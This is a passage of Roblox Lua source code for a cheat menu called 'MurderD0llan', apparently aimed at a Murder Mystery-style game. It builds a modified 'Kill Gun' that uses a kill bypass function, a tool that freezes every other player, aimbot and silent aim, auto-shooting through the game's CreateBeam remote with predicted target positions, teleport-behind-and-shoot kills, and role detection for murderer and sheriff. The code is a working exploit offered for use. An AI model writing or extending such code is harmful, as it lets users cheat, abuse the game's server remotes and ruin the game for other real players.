				if ShootInDirections then
					local right = Vector3.new(1, 0, 0)
					fireRay((baseDir + right * 0.1).Unit)
					fireRay(baseDir)
					fireRay((baseDir - right * 0.1).Unit)
				else
					fireRay(baseDir)
				end

				if InstantReload then
					canShoot = true
				else
					task.spawn(function()
						task.wait(RELOAD_COOLDOWN)
						reloadGun()
					end)
				end
			end

			tool.Activated:Connect(function()
				shoot()
				if HoldClickToShootMultipleAtOnce then
					local conn
					conn = game:GetService("RunService").RenderStepped:Connect(function()
						if not UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
							conn:Disconnect()
						else
							shoot()
						end
					end)
				end
			end)

			tool.Equipped:Connect(function()
				handle.Mask_Equip:Play()
				mouse.Icon = "http://www.roblox.com/asset/?id=79658449"
			end)

			tool.Unequipped:Connect(function()
				handle.Mask_Equip:Play()
				mouse.Icon = ""
			end)

			local IsHiden = false

			-- GUI setup (solo se carga una vez)
			local function setupGunGUI()
				if game.Players.LocalPlayer.PlayerGui:FindFirstChild("GunSettingsGui") then return end

				local player = game.Players.LocalPlayer
				local playerGui = player:WaitForChild("PlayerGui")

				local ScreenGui = Instance.new("ScreenGui")
				ScreenGui.Name = "GunSettingsGui"
				ScreenGui.Parent = playerGui
				ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

				local Frame = Instance.new("Frame")
				Frame.Parent = ScreenGui
				Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Frame.BackgroundTransparency = 0.7
				Frame.Position = UDim2.new(0.331, 0, 0.331, 0)
				Frame.Size = UDim2.new(0, 228, 0, 205)
				Frame.Draggable = true
				Frame.Active = true
				Frame.Visible = not IsHiden -- Oculto si IsHiden es true

				local TextButton = Instance.new("TextButton")
				TextButton.Parent = ScreenGui
				TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				TextButton.BackgroundTransparency = 0.9
				TextButton.BorderSizePixel = 0
				TextButton.Position = UDim2.new(0, 10, 0.5, -12) -- Izquierda centrado verticalmente
				TextButton.Size = UDim2.new(0, 30, 0, 25)
				TextButton.Font = Enum.Font.SourceSans
				TextButton.Text = "FG"
				TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
				TextButton.TextSize = 14
				TextButton.TextTransparency = 0.1
				TextButton.Visible = IsHiden

				TextButton.MouseButton1Click:Connect(function()
					IsHiden = false
					Frame.Visible = true
					TextButton.Visible = false
				end)

				local Title = Instance.new("TextLabel")
				Title.Parent = Frame
				Title.Size = UDim2.new(0, 203, 0, 27)
				Title.BackgroundTransparency = 0.5
				Title.Text = (GunName or "Modified").." Gun - GUI (By G0bbyD0llan)"
				Title.Font = Enum.Font.SourceSans
				Title.TextSize = 14
				Title.TextColor3 = Color3.new(0, 0, 0)

				local close = Instance.new("TextButton")
				close.Parent = Frame
				close.Size = UDim2.new(0, 25, 0, 27)
				close.Position = UDim2.new(0.89, 0, 0, 0)
				close.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
				close.BackgroundTransparency = 0.6
				close.Text = "X"
				close.TextScaled = true
				close.Font = Enum.Font.SourceSans
				close.TextColor3 = Color3.new(0, 0, 0)

				close.MouseButton1Click:Connect(function()
					Frame.Visible = false
					IsHiden = true
					TextButton.Visible = true
				end)

				local ContentArea = Instance.new("Frame")
				ContentArea.Parent = Frame
				ContentArea.Position = UDim2.new(0, 0, 0.23, 0)
				ContentArea.Size = UDim2.new(0, 228, 0, 110)
				ContentArea.BackgroundTransparency = 1

				local UIListLayout = Instance.new("UIListLayout")
				UIListLayout.Parent = ContentArea
				UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				UIListLayout.Padding = UDim.new(0, 8)

				local function createToggleButton(label, defaultValue, callback)
					local button = Instance.new("TextButton")
					button.Size = UDim2.new(0, 200, 0, 24)
					button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
					button.BackgroundTransparency = 0.5
					button.BorderColor3 = Color3.fromRGB(255, 255, 255)
					button.TextColor3 = Color3.fromRGB(255, 255, 255)
					button.Font = Enum.Font.SourceSans
					button.TextSize = 14
					button.Text = label .. ": " .. tostring(defaultValue)
					button.Parent = ContentArea

					local state = defaultValue
					button.MouseButton1Click:Connect(function()
						state = not state
						button.Text = label .. ": " .. tostring(state)
						callback(state)
					end)
				end

				-- Botones con lógica
				createToggleButton("Instant Reload", InstantReload, function(val)
					InstantReload = val
				end)

				createToggleButton("Hold Click Multi", HoldClickToShootMultipleAtOnce, function(val)
					HoldClickToShootMultipleAtOnce = val
				end)

				createToggleButton("Shoot in Directions", ShootInDirections, function(val)
					ShootInDirections = val
				end)

				createToggleButton("Create Hit Markers", CreateHitMarkers, function(val)
					CreateHitMarkers = val
				end)

				createToggleButton("Silent AIM", SilentAimOnShoot, function(val)
					SilentAimOnShoot = val
				end)
			end

			-- Llama a la GUI al equipar el arma
			tool.Equipped:Connect(function()
				setupGunGUI()
			end)

			tool.Unequipped:Connect(function()
				local gui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("GunSettingsGui")
				if gui then
					gui:Destroy()
				end
			end)

			print("Client Gun Script loaded for " .. player.Name .. ". Tool: " .. tool:GetFullName())
		end)
	end

	local ConnectionV11

	local KillGun = script.Parent.KillGun

	local IsActiveKillGun = false

	local KillGunFrameBGC3 = KillGun.Frame

	KillGun.MouseButton1Click:Connect(function()

		if not IsActiveKillGun then
			IsActiveKillGun = true
			KillGunFrameBGC3.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			GiveModifiedGun("Kill", function(Player)
				killAsMURDERERBypass(Player)
			end)

			ConnectionV11 = LocalPlayer.CharacterAdded:Connect(function()
				GiveModifiedGun("Kill", function(Player)
					killAsMURDERERBypass(Player)
				end)
			end)
		else
			if ConnectionV11 then
				ConnectionV11:Disconnect()
			end

			--dectect in backpack or character
			if LocalPlayer.Character:FindFirstChild("KillGun") then
				LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
			end
			game["Run Service"].RenderStepped:Wait()
			if LocalPlayer.Backpack:FindFirstChild("KillGun") then
				LocalPlayer.Backpack.KillGun:Destroy()
			end
			IsActiveKillGun = false
			KillGunFrameBGC3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
		end
	end)


	--------------------------------

	task.spawn(function()
		local Players = game:GetService("Players")

		local LocalPlayer = Players.LocalPlayer
		local STOPTHETIMETool = script.Parent.STOPTHETIME
		local STOPTHETIMEToolFrame = STOPTHETIMETool:WaitForChild("Frame")

		local IsActiveSTTT = false
		local ConnectionV14
		local GeneratedToolSTTT

		-- 🔧 Crea la herramienta solo una vez
		local function createTool()
			if GeneratedToolSTTT then return end

			local tool = Instance.new("Tool")
			tool.Name = "StopTheTime"
			tool.RequiresHandle = true
			tool.CanBeDropped = false

			local handle = Instance.new("Part")
			handle.Name = "Handle"
			handle.Size = Vector3.new(1, 1, 1)
			handle.Transparency = 1
			handle.Anchored = false
			handle.CanCollide = false
			handle.Parent = tool


			tool.Equipped:Connect(function()
				local function freezePlayer(targetPlayer)
					local char = targetPlayer.Character
					if not char then return end

					-- Congelar posición
					for _, part in pairs(char:GetDescendants()) do
						if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
							part.Anchored = true
						end
					end

					-- Pausar animaciones
					local humanoid = char:FindFirstChildOfClass("Humanoid")
					if humanoid then
						for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
							track:AdjustSpeed(0)
						end
					end

					-- Congelar herramientas equipadas
					local toolEquipped = char:FindFirstChildOfClass("Tool")
					if toolEquipped then
						local triedToRemove = false

						-- Reequipar si la quitan
						toolEquipped.AncestryChanged:Connect(function()
							if triedToRemove then return end
							triedToRemove = true
							task.wait(0.1)
							toolEquipped.Parent = char
						end)
					end
				end

				-- Aplica a todos los jugadores menos a uno mismo
				for _, player in ipairs(game.Players:GetPlayers()) do
					if player ~= LocalPlayer then
						freezePlayer(player)
					end
				end
			end)

			tool.Unequipped:Connect(function()
				-- Al soltar el tool, desancla y reanima
				for _, player in ipairs(game.Players:GetPlayers()) do
					if player ~= LocalPlayer and player.Character then
						for _, part in pairs(player.Character:GetDescendants()) do
							if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
								part.Anchored = false
							end
						end

						local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
								track:AdjustSpeed(1)
							end
						end
					end
				end
			end)


			tool.Parent = LocalPlayer:WaitForChild("Backpack")
			GeneratedToolSTTT = tool
		end

		local function giveTool()
			if not GeneratedToolSTTT then
				createTool()
			end

			local backpack = LocalPlayer:FindFirstChild("Backpack")
			if backpack and not backpack:FindFirstChild("StopTheTime") then
				GeneratedToolSTTT.Parent = backpack
			end
		end

		local function removeTool()
			for _, loc in ipairs({LocalPlayer.Character, LocalPlayer.Backpack}) do
				local tool = loc and loc:FindFirstChild("StopTheTime")
				if tool then
					tool.Parent = nil
				end
			end
		end

		local function toggleSTTT()
			IsActiveSTTT = not IsActiveSTTT

			if IsActiveSTTT then
				STOPTHETIMEToolFrame.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
				giveTool()

				ConnectionV14 = LocalPlayer.CharacterAdded:Connect(function()
					task.wait(1)
					giveTool()
				end)
			else
				STOPTHETIMEToolFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
				removeTool()

				if ConnectionV14 then
					ConnectionV14:Disconnect()
					ConnectionV14 = nil
				end
			end
		end

		STOPTHETIMETool.MouseButton1Click:Connect(toggleSTTT)

	end)
end;
task.spawn(C_fb);
-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_4.HandlerV4
local function C_132()
	local script = G2L["132"];
	local contenedorBusqueda = script.Parent -- Cambia esto a la ruta del objeto donde quieres buscar
	local Notificaciones = {
		Error = "rbxassetid://4041673253",
		Aviso = "rbxassetid://4026367629",
		Correcto = "rbxassetid://4094488012",
	}


	local Notification_Service = require(script.Parent.Parent.Parent.Parent:FindFirstChild("NotificationService"))

	local function errornotify(text)
		Notification_Service.ShowNotification({
			title = "Error / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Error,
			theme = "Error"
		})
	end

	local function sucessnotify(text)
		Notification_Service.ShowNotification({
			title = "Success / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Correcto,
			theme = "Success"
		})
	end

	local function warningnotify(text)
		Notification_Service.ShowNotification({
			title = "Warning / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Aviso,
			theme = "Warning"
		})
	end
	local Players = game:GetService("Players")
	local Parent = script.Parent

	local function MouseButton1Click(TextToSearch: string, Function)
		for i, v in pairs(contenedorBusqueda:GetChildren()) do
			if v:IsA("TextButton") and string.find(string.lower(v.Text), string.lower(TextToSearch)) then
				if game:GetService("RunService"):IsStudio() then
					print("[MurderD0llan]: "..TextToSearch.." - Found")
				end
				v.MouseButton1Click:Connect(Function)
			end
		end
	end


	local function FindButton(TextToSearch: string)
		for _, instancee in pairs(contenedorBusqueda:GetChildren()) do
			if instancee:IsA("TextButton") and instancee.Text:lower() == TextToSearch:lower() then
				print(instancee:GetFullName().." found")
				return instancee
			end
		end
	end

	local function FindButtonWithMatchedString(TextToSearch: string)
		for i, v in pairs(contenedorBusqueda:GetChildren()) do
			if v:IsA("TextButton") and string.find(string.lower(v.Text), string.lower(TextToSearch)) then
				print(v:GetFullName().." found")
				return v
			end
		end
	end

	local shootOffset = 2.8
	local offsetToPingMult = 1


	local function PredictShootPosition(player: Player, shootOffset: number)
		pcall(function()
			player = player.Character
			if not player.Character then errornotify("Invalid Args (player is NIL)") return end
		end)
		local localplayer = game:GetService("Players").LocalPlayer
		local playerHRP = player:FindFirstChild("UpperTorso")
		local playerHum = player:FindFirstChild("Humanoid")
		if not playerHRP or not playerHum then
			errornotify("Invalid Args (player's HumanoidRootPart = NIL)")
			return nil
		end

		local playerPosition = playerHRP.Position
		local velocity = Vector3.new()
		velocity = playerHRP.AssemblyLinearVelocity
		local playerMoveDirection = playerHum.MoveDirection
		local playerLookVec = playerHRP.CFrame.LookVector
		local yVelFactor = velocity.Y > 0 and -1 or 0.5
		local predictedPosition
		predictedPosition = playerHRP.Position + ((velocity * Vector3.new(0, 0.5, 0))) * (shootOffset / 15) +playerMoveDirection * shootOffset
		predictedPosition = predictedPosition * (((localplayer:GetNetworkPing() * 1000) * ((offsetToPingMult - 1) * 0.01)) + 1)
		-- failed so hard i had to revert back to v1.11 :sob:

		--predictedPosition = Vector3.new(predictedPositiomurdererHRP.Position + ((murdererVelocity * Vector3.new(0, 0.5, 0))) * (shootOffset / 15) + murderer.Character.Humanoid.MoveDirection * shootOffsetn.X, math.clamp(predictedPosition.Y, playerPosition.Y - 2, playerPosition.Y + 2), predictedPosition.Z)


		return predictedPosition
	end


	local localPlayer = game:GetService("Players").LocalPlayer
	local function Shoot(targetPlayer: Player)
		local targetChar = targetPlayer.Character
		if not targetChar then return end

		local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
		if not targetHRP then return end

		local predictedPosition = PredictShootPosition(targetPlayer)

		local gun = localPlayer.Character and localPlayer.Character:FindFirstChild("Gun")
		if not gun then return end

		local createBeamRF = gun:FindFirstChild("KnifeLocal") and gun.KnifeLocal:FindFirstChild("CreateBeam")
		if not (createBeamRF and createBeamRF:IsA("RemoteFunction")) then
			errornotify("Missing 'CreateBeam' RemoteFunction.")
			return
		end

		local args = {
			[1] = 1,
			[2] = predictedPosition,
			[3] = "AH2"
		}



		createBeamRF:InvokeServer(unpack(args))
	end



	local function FindGun()
		--try to find gun in localplayer backpack or character
		local gun = localPlayer.Backpack:FindFirstChild("Gun") or localPlayer.Character:FindFirstChild("Gun")
		return gun
	end
	local function SherrifKill(targetPlayer: Player)
		if not (targetPlayer and targetPlayer.Character) then 
			errornotify("Invalid target player or missing character.")
			return 
		end

		local localChar = localPlayer.Character
		local humanoid = localChar and localChar:FindFirstChildWhichIsA("Humanoid")
		if not humanoid then 
			errornotify("Local player's humanoid not found.")
			return 
		end

		local gun = localPlayer.Backpack:FindFirstChild("Gun") or localChar:FindFirstChild("Gun")
		if not gun then
			errornotify("No gun named 'Gun' found in inventory or character.")
			return
		end

		-- Equip the gun
		if gun.Parent == localPlayer.Backpack then
			humanoid:EquipTool(gun)
			task.wait(0.1)
		end

		local originalCFrame = localChar:GetPivot()

		-- Teleport behind the target
		local targetChar = targetPlayer.Character
		local targetHRP = targetChar:FindFirstChild("HumanoidRootPart")
		if not targetHRP then
			errornotify("Target's HumanoidRootPart not found.")
			return
		end

		local backPosition = targetHRP.CFrame * CFrame.new(0, 0, 3)
		localChar:PivotTo(backPosition)

		-- Repeatedly shoot for up to 15 seconds or until target is dead
		local startTime = tick()
		local targetHumanoid = targetChar:FindFirstChildOfClass("Humanoid")

		if not targetHumanoid then
			errornotify("Target's Humanoid not found.")
			return
		end


		while targetHumanoid.Health > 0 and tick() - startTime <= 15 do
			Shoot(targetPlayer)
			task.wait(0.2)
		end

		if targetHumanoid.Health <= 0 then
			sucessnotify("Target eliminated successfully.")
		else
			warningnotify("Timeout: Target wasn't killed within 15 seconds.")
		end

		-- Unequip the gun
		humanoid:UnequipTools()
		task.wait(0.1)

		-- Return to original position
		localChar:PivotTo(originalCFrame)
	end


	local function findMurderer()


		-- Fallback
		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("Knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("Knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("knife") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("knife") then
				return i
			end
		end

		return nil
	end

	local function findSheriff()


		-- Fallback
		for _, i in ipairs(game.Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("Gun") then
				return i
			end
		end

		for _, i in ipairs(game.Players:GetPlayers()) do
			if not i.Character then continue end
			if i.Character:FindFirstChild("Gun") then
				return i
			end
		end



		return nil
	end

	MouseButton1Click("Shoot at random player", function()
		--views for every nearest player to localplayer and then uses raycast to verify that player can be shooted
		local nearestPlayer = nil
		local nearestDistance = math.huge
		for _, player in ipairs(game.Players:GetPlayers()) do
			if player ~= localPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
				local distance = (localPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
				if distance < nearestDistance then
					nearestDistance = distance
					nearestPlayer = player
				end
			end
		end
		if nearestPlayer then
			Shoot(nearestPlayer)
		end
	end)

	MouseButton1Click("shoot at murder", function()
		local murderer = findMurderer()
		if murderer then
			Shoot(murderer)
		else
			errornotify("Murderer not found.")
		end
	end)

	local loops = {
		Auto_Shoot_At_Murder = false,
		spam_gun = false,
	}

	local Connection

	local Auto_Shoot_At_Murder = script.Parent.autoshootatmurder
	local IsActiveASAMframe = Auto_Shoot_At_Murder.Frame
	local IsActiveASAM = false
	local rs = game:GetService("RunService")
	local localplayer = game:GetService("Players").LocalPlayer

	local ConnectionForASAM 
	script.Parent.autoshootatmurder.MouseButton1Click:Connect(function()
		if not IsActiveASAM then
			IsActiveASAM = true
			IsActiveASAMframe.BackgroundColor3 = Color3.new(0, 1, 0)
			if ConnectionForASAM then
				ConnectionForASAM:Disconnect()
			end
			ConnectionForASAM = rs.Stepped:Connect(function()
				if findSheriff() ~= localplayer then 
					return 
				end

				local murderer = findMurderer()
				if not murderer then
					return
				end

				local murdererHRP = murderer.Character:FindFirstChild("HumanoidRootPart")
				if not murdererHRP then

					return
				end
				-- shoot a ray from player to murderer
				local origin = localplayer.Character.HumanoidRootPart.Position
				local direction = (Vector3.new(murdererHRP.Position.X, origin.Y, murdererHRP.Position.Z) - origin).unit * 1000
				local params = RaycastParams.new()

				local raycastResult = workspace:Raycast(origin, direction, params)
				if raycastResult then
					if raycastResult.Instance == murdererHRP then
						local predictedPosition = PredictShootPosition(murderer, shootOffset)

						local args = {
							[1] = 1,
							[2] = predictedPosition,
							[3] = "AH2"
						}


						localplayer.Character.Gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack(args))
					end
				end
			end)
		else
			IsActiveASAM = false
			IsActiveASAMframe.BackgroundColor3 = Color3.new(1, 0, 0)
			if ConnectionForASAM then
				ConnectionForASAM:Disconnect()
			end
		end

	end)

	MouseButton1Click("TP-Kill murder", function()
		if findMurderer() == localPlayer then return end
		SherrifKill(findMurderer())
	end)

	local ToWait = 0.05
	script.Parent.spamgun.MouseButton1Click:Connect(function()
		if loops.spam_gun == true then
			loops.spam_gun = false
			script.Parent.spamgun.Frame.BackgroundColor3 = Color3.new(1, 0, 0)

		else
			loops.spam_gun = true
			script.Parent.spamgun.Frame.BackgroundColor3 = Color3.new(0, 1, 0)
			task.spawn(function()
				while loops.spam_gun do
					if findSheriff() == localPlayer then
						--equipps and unequips the gun
						local gun = FindGun()
						--check gun parent
						if gun.Parent == localPlayer.Backpack then
							localPlayer.Character:FindFirstChildOfClass("Humanoid"):EquipTool(gun)
						elseif gun.Parent == localPlayer.Character then
							localPlayer.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
						end
						wait(ToWait)
					end
				end
			end)

		end
	end)
	local ToWaitList = {
		0.05,
		0.1,
		0.01,
		0.2,
		0.5
	}
	local index = 1
	local TextSavedSG = script.Parent.spamgun.Text
	script.Parent.spamgun.MouseButton2Click:Connect(function()
		if index == #ToWaitList + 1 then
			index = 1
		else
			index += 1
		end
		ToWait = ToWaitList[index]
		script.Parent.spamgun.Text = TextSavedSG.. " ("..tostring(ToWait)..")"
	end)

	local ConnectionV3

	local ABTM = script.Parent.AimBotToMurder

	local IsActiveABTM = ABTM.Frame
	-- Toggle del botón
	local camera = game:GetService("Workspace").CurrentCamera
	ABTM.MouseButton1Click:Connect(function()
		local isRed = IsActiveABTM.BackgroundColor3 == Color3.new(1, 0, 0)

		if isRed then
			IsActiveABTM.BackgroundColor3 = Color3.new(0, 1, 0)

			ConnectionV3 = rs.Stepped:Connect(function()
				if findSheriff() == localPlayer then
					local murderer = findMurderer()
					if murderer then
						local predicted = PredictShootPosition(murderer)
						if predicted then
							camera.CFrame = CFrame.new(camera.CFrame.Position, predicted)
						end
					end
				end
			end)

		else
			IsActiveABTM.BackgroundColor3 = Color3.new(1, 0, 0)
			if ConnectionV3 then
				ConnectionV3:Disconnect()
				ConnectionV3 = nil
			end
		end
	end)

	task.spawn(function()
		local selectingKey = false
		local UserInputService = game:GetService("UserInputService")
		local button = FindButton("shoot murder - not selected key  ")
		local flashing = false
		local originalBGColor = button.BackgroundColor3
		local originalTextStroke = button.TextStrokeColor3
		local selectedKey = Enum.KeyCode.Unknown
		local function startKeySelection()
			if selectingKey then return end
			selectingKey = true
			button.Text = "  Press any key..."
			button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
			flashing = true

			-- Flash stroke
			task.spawn(function()
				while flashing do
					button.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
					task.wait(0.5)
					button.TextStrokeColor3 = originalTextStroke
					task.wait(0.5)
				end
			end)
		end

		local function onInputBegan(input, gameProcessed)
			if selectingKey and not gameProcessed then
				if input.UserInputType == Enum.UserInputType.Keyboard then
					selectedKey = input.KeyCode
					local keyName = selectedKey.Name
					button:SetAttribute("SELECTED_KEY", keyName)
					button.Text = string.format("  shoot murder - %s", keyName)
					selectingKey = false
					flashing = false
					button.BackgroundColor3 = originalBGColor
					button.TextStrokeColor3 = originalTextStroke
				end
			end
		end

		button.MouseButton1Click:Connect(startKeySelection)
		UserInputService.InputBegan:Connect(onInputBegan)
	end)

	local SWKPButton = script.Parent.shootmurderwhenpressingkey
	local IsActiveSWKP = false
	local IsActiveFrameSWKP = SWKPButton.Frame
	local UserInputService = game:GetService("UserInputService")
	local ConnectionForSWKP

	local function getselectedkeyforSKWP()
		local button = FindButtonWithMatchedString("shoot murder -")
		--
		if button:GetAttribute("SELECTED_KEY") then
			return Enum.KeyCode[button:GetAttribute("SELECTED_KEY")]
		else
			return Enum.KeyCode.Unknown
		end
	end

	SWKPButton.MouseButton1Click:Connect(function()
		if not IsActiveSWKP then
			IsActiveSWKP = true
			IsActiveFrameSWKP.BackgroundColor3 = Color3.new(0, 1, 0)
			ConnectionForSWKP = UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if input.KeyCode == getselectedkeyforSKWP() and not gameProcessed then
					if findSheriff() == localPlayer then
						local pos = findMurderer()
						if pos then
							Shoot(pos)
						end
					end
				end
			end)
		else
			IsActiveSWKP = false
			IsActiveFrameSWKP.BackgroundColor3 = Color3.new(1, 0, 0)
			if ConnectionForSWKP then
				ConnectionForSWKP:Disconnect()
				ConnectionForSWKP = nil
			end
		end
	end)

	local connectionv5
	script.Parent.antisherrif.MouseButton1Click:Connect(function()
		if not connectionv5 then
			connectionv5 = localPlayer.Backpack.ChildAdded:Connect(function(child)
				if child:IsA("Tool") and child.Name == "Gun" then
					--kill lp
					localPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
				end
			end)
			script.Parent.antisherrif.Frame.BackgroundColor3 = Color3.new(0, 1, 0)
		else
			if connectionv5 then
				connectionv5:Disconnect()
				connectionv5 = nil
			end
			script.Parent.antisherrif.Frame.BackgroundColor3 = Color3.new(1, 0, 0)
		end
	end)

	task.spawn(function()
		local selectingKey = false
		local UserInputService = game:GetService("UserInputService")
		local button = FindButton("camera Kill Murder - not selected key  ")
		local flashing = false
		local originalBGColor = button.BackgroundColor3
		local originalTextStroke = button.TextStrokeColor3
		local selectedKey = Enum.KeyCode.Unknown
		local function startKeySelection()
			if selectingKey then return end
			selectingKey = true
			button.Text = "  Press any key..."
			button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
			flashing = true

			-- Flash stroke
			task.spawn(function()
				while flashing do
					button.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
					task.wait(0.5)
					button.TextStrokeColor3 = originalTextStroke
					task.wait(0.5)
				end
			end)
		end

		local function onInputBegan(input, gameProcessed)
			if selectingKey and not gameProcessed then
				if input.UserInputType == Enum.UserInputType.Keyboard then
					selectedKey = input.KeyCode
					local keyName = selectedKey.Name
					button:SetAttribute("SELECTED_KEY", keyName)
					button.Text = string.format("  camera Kill Murder - %s", keyName)
					selectingKey = false
					flashing = false
					button.BackgroundColor3 = originalBGColor
					button.TextStrokeColor3 = originalTextStroke
				end
			end
		end

		button.MouseButton1Click:Connect(startKeySelection)
		UserInputService.InputBegan:Connect(onInputBegan)
	end)
	local RunService = game:GetService("RunService")
	local SoundService = game:GetService("SoundService")
	local Players = game:GetService("Players")

	local localPlayer = Players.LocalPlayer
	local busdtton = script.Parent.swnm
	local indicator = busdtton:FindFirstChild("Frame")

	local heartbeatConnection
	local proximitySound = Instance.new("Sound")
	proximitySound.Name = "ProximityAlert"
	proximitySound.Parent = SoundService
	proximitySound.SoundId = "rbxassetid://8055713313"
	proximitySound.Looped = true
	proximitySound.Volume = 0.8

	-- Cambia estos valores si usas otras funciones o quieres más precisión
	local PROXIMITY_RADIUS = 100

	-- Función para comenzar a monitorear al asesino
	local function startMonitoring()
		heartbeatConnection = RunService.Heartbeat:Connect(function()
			local character = localPlayer.Character
			local hrp = character and character:FindFirstChild("HumanoidRootPart")
			if not hrp then return end

			local isSheriff = findSheriff() == localPlayer
			if not isSheriff then
				proximitySound:Stop()
				return
			end

			local murdererPos = findMurderer()
			if murdererPos then
				local distance = (murdererPos - hrp.Position).Magnitude
				if distance < PROXIMITY_RADIUS then
					if not proximitySound.IsPlaying then
						proximitySound:Play()
					end
				else
					if proximitySound.IsPlaying then
						proximitySound:Stop()
					end
				end
			end
		end)

		if indicator then
			indicator.BackgroundColor3 = Color3.new(0, 1, 0) -- Verde: activado
		end
	end

	-- Función para detener el monitoreo
	local function stopMonitoring()
		if heartbeatConnection then
			heartbeatConnection:Disconnect()
			heartbeatConnection = nil
		end
		proximitySound:Stop()

		if indicator then
			indicator.BackgroundColor3 = Color3.new(1, 0, 0) -- Rojo: desactivado
		end
	end

	-- Al hacer clic en el botón
	busdtton.MouseButton1Click:Connect(function()
		if heartbeatConnection then
			stopMonitoring()
		else
			startMonitoring()
		end
	end)

	local das = script.Parent.swmpk
	local indicator = das:FindFirstChild("Frame")

	local connectionV7
	local knifeSound = proximitySound
	-- Nombre del cuchillo que buscas. Ajusta según tu juego.
	local KNIFE_TOOL_NAME = "Knife"

	-- Revisa si el asesino tiene el cuchillo equipado o en la mano
	local function murdererHasKnifeEquipped(murderer)
		if not murderer then return false end

		local character = murderer.Character
		if not character then return false end

		local tool = character:FindFirstChildOfClass("Tool")
		return tool and tool.Name == KNIFE_TOOL_NAME
	end

	-- Activar la vigilancia del cuchillo
	local function startKnifeMonitoring()
		connectionV7 = RunService.Heartbeat:Connect(function()
			local murderer = findMurderer()

			if murderer and murdererHasKnifeEquipped(murderer) then
				if not knifeSound.IsPlaying then
					knifeSound:Play()
				end
			else
				if knifeSound.IsPlaying then
					knifeSound:Stop()
				end
			end
		end)

		if indicator then
			indicator.BackgroundColor3 = Color3.new(0, 1, 0) -- Verde = activado
		end
	end

	-- Detener la vigilancia
	local function stopKnifeMonitoring()
		if connectionV7 then
			connectionV7:Disconnect()
			connectionV7 = nil
		end
		knifeSound:Stop()

		if indicator then
			indicator.BackgroundColor3 = Color3.new(1, 0, 0) -- Rojo = desactivado
		end
	end

	-- Evento al presionar el botón
	das.MouseButton1Click:Connect(function()
		if connectionV7 then
			stopKnifeMonitoring()
		else
			startKnifeMonitoring()
		end
	end)

	MouseButton1Click("reset but no one can pick the gun", function()
		localPlayer.Character:PivotTo(CFrame.new(0, 10^10, 0))
		wait(0.3)
		localPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
	end)

	----------------

	local Mouse = game.Players.LocalPlayer:GetMouse()
	local LocalPlayer = localPlayer

	local function StartSelectModeWithLPMouse(callback)
		local selectionActive = true
		local highlightInstance = nil
		local connection

		warningnotify("Click on a player to select him (15 seconds).")

		-- Finaliza el modo de selección
		local function endSelection()
			selectionActive = false
			if connection then
				connection:Disconnect()
			end
			if highlightInstance then
				highlightInstance:Destroy()
			end
		end

		-- Espera 1 segundo antes de permitir seleccionar
		task.delay(1, function()
			if not selectionActive then return end

			connection = Mouse.Button1Down:Connect(function()
				if not selectionActive then return end

				local target = Mouse.Target
				if not target then
					errornotify("You are not aiming at any object.")
					return
				end

				local model = target:FindFirstAncestorOfClass("Model")
				if not model then
					errornotify("You are not targeting a player.")
					return
				end

				local selectedPlayer = Players:GetPlayerFromCharacter(model)
				if selectedPlayer and selectedPlayer ~= LocalPlayer then
					sucessnotify("You have selected: " .. selectedPlayer.Name)

					-- Highlight temporal
					highlightInstance = Instance.new("Highlight")
					highlightInstance.Name = "TemporaryHighlight"
					highlightInstance.FillColor = Color3.fromRGB(255, 255, 0)
					highlightInstance.OutlineColor = Color3.fromRGB(255, 255, 0)
					highlightInstance.Adornee = model
					highlightInstance.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
					highlightInstance.Parent = model

					callback(selectedPlayer)
					task.delay(2, endSelection)
				else
					errornotify("You have not selected a valid player.")
				end
			end)
		end)

		-- Tiempo límite
		task.delay(15, function()
			if selectionActive then
				errornotify("Time out. No player selected.")
				endSelection()
			end
		end)
	end
	local selectedplayerforGG = nil

	MouseButton1Click("select a player here...", function()
		StartSelectModeWithLPMouse(function(Player)
			selectedplayerforGG = Player
		end)
	end)

	MouseButton1Click("give gun to player", function()
